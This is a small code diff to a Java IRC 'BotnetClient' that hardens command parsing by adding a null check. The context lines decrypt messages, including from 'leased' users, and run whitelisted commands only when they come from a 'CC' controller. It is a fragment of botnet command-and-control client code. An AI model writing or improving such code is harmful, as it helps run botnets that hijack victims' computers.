@@ -106,7 +106,7 @@ public class BotnetClient extends PircBot {
 		System.out.println("m1: " + decMsg);
 		String leasedDecMsg = leased ? leasedM.decryptMsg(message) : null;
 		System.out.println("m2: " + leasedDecMsg);
-		String command = decMsg.split(" ").length > 0 ? decMsg.split(" ")[0] : decMsg;
+		String command = decMsg != null && decMsg.split(" ").length > 0 ? decMsg.split(" ")[0] : decMsg;
 		String leasedCommand = leasedDecMsg != null && leasedDecMsg.split(" ").length > 0 ? leasedDecMsg.split(" ")[0] : leasedDecMsg;
 		if (sender.equals(CC) && COMMANDS.contains(command)) {
 			runCommand(decMsg, hostname, sender);
